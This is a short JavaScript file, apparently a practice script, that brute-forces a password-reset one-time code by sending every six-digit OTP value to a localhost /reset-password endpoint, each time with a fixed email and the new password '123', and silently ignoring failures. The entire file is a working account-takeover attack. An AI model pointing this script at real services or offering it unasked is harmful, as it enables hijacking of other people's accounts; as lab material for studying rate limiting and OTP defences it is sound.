import axios from "axios";
async function main() {
    for (let i = 100000; i < 999999; i += 100) {
        for (let j = 0; j < 100; j++) {
            console.log(i)

            try {
                await axios.post("http://localhost:3000/reset-password", {
                    "email": "vishal1@gmail.com",
                    "otp": (i + j).toString(),
                    "newPassword": "123"
                })

            } catch (error) {

            }

        }
    }
}

main();

